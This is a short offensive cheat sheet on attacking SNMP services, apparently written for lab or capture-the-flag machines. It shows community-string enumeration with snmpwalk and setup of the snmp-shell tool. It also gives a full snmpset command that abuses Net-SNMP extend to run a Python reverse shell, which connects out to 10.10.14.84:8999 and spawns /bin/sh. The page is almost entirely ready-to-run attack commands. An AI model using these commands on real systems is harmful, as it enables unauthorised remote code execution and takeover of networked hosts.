# 🟢 SNMP

```
snmpwalk -v2c -c public 10.129.129.248 > snmp.txt
```

{% embed url="https://www.poplabsec.com/snmp-penetration-testing/" %}

### **Getting the Shell** **from Net-SNMP Extend**

```
sudo apt install snmp snmp-mibs-downloader rlwrap -y
git clone https://github.com/mxrch/snmp-shell
cd snmp-shell
sudo python3 -m pip install -r requirements.txt
```

**Creating reverse shell**

You can also create reverse shell manually by injecting the command below into the SNMP

```
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.84\",8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
```
